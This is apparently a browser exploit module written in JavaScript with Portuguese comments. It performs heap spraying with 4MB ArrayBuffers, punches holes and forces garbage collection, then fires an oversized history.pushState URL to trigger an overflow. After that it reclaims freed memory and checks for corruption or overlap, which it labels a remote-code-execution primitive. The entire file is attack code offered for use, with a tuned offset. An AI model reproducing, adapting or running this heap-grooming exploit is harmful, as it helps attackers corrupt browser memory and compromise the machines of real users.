/* MÓDULO: TITAN WAR 
   Foca no ataque Large Heap / Mmap Overlap
*/

const BTN_ID = "btnTitan";
const LOG_ID = "log";

// Configuração Inicial ao carregar o módulo
const btn = document.getElementById(BTN_ID);
if (btn) {
    btn.addEventListener("click", () => {
        uiLogger("--- Iniciando Módulo: TITAN WAR ---");
        startTitanWar();
    });
    console.log(`[Titan Module] Atrelado ao botão #${BTN_ID}`);
} else {
    console.error(`[Titan Module] Botão #${BTN_ID} não encontrado no HTML!`);
}

// --- LÓGICA DO ATAQUE ---

async function startTitanWar() {
    // Atualizado para sua observação do offset seguro
    const BASE_OFFSET = 709523; 
    const OVERFLOW_AMT = 1024 * 1024 * 2; // 2MB
    const TITAN_SIZE = 1024 * 1024 * 4;   // 4MB
    const TITAN_COUNT = 40; 

    var victims = [];
    var reclaimers = [];

    uiLogger(`1. Convocando ${TITAN_COUNT} Titãs (4MB) Offset: ${BASE_OFFSET}...`);
    
    // FASE 1: SPRAY
    for(let i=0; i<TITAN_COUNT; i++) {
        let ab = new ArrayBuffer(TITAN_SIZE);
        let view = new Uint8Array(ab);
        view[0] = 0xCC; 
        view[TITAN_SIZE-1] = 0xCC;
        victims.push(ab);
    }

    // FASE 2: HOLES
    uiLogger("2. Abrindo clareiras...");
    for(let i=0; i<TITAN_COUNT; i+=3) {
        victims[i] = null;
    }

    await forceGC();

    // FASE 3: EXPLOIT
    uiLogger("3. Disparando Overflow...");
    
    setTimeout(() => {
        try {
            let buffer = "A".repeat(BASE_OFFSET);
            buffer += "\x01".repeat(OVERFLOW_AMT);

            history.pushState({}, "titan_pwn", "/" + buffer);

            uiLogger("4. Tentando realocação (Reclaim)...");
            tryReclaim(reclaimers, victims, TITAN_SIZE);

        } catch (e) {
            uiLogger("Erro Crítico (OOM): " + e.message);
        }
    }, 500);
}

function tryReclaim(reclaimers, victims, size) {
    for(let i=0; i<20; i++) {
        let ab = new ArrayBuffer(size);
        let view = new Uint8Array(ab);
        view[0] = 0xAA;
        reclaimers.push(ab);
    }
    checkOverlap(reclaimers, victims);
}

function checkOverlap(reclaimers, victims) {
    let success = false;
    
    // Checa Vítimas
    for(let i=0; i<victims.length; i++) {
        let v = victims[i];
        if(!v) continue;
        let view = new Uint8Array(v);
        
        if (view[0] === 1) {
            uiLogger(`!!! SUCESSO !!! Titã ${i} corrompido (0x01)!`, 'win');
            success = true;
        }
        if (view[0] === 0xAA) {
            uiLogger(`!!! JACKPOT !!! Titã ${i} sobreposto!`, 'win');
            alert("RCE PRIMITIVE: MEMORY OVERLAP!");
            success = true;
        }
    }

    // Checa Novos
    for(let i=0; i<reclaimers.length; i++) {
        let r = reclaimers[i];
        let view = new Uint8Array(r);
        if (view[0] === 1 || view[0] === 0xCC) {
            uiLogger(`!!! JACKPOT !!! Novo Buffer ${i} nasceu sujo!`, 'win');
            alert("RCE PRIMITIVE: MEMORY OVERLAP!");
            success = true;
        }
    }

    if(!success) uiLogger("Nenhum overlap detectado.");
}

async function forceGC() {
    try { new ArrayBuffer(100 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 1000));
}

function uiLogger(msg, type) {
    const el = document.getElementById(LOG_ID);
    let style = type === 'win' ? 'class="win"' : '';
    el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}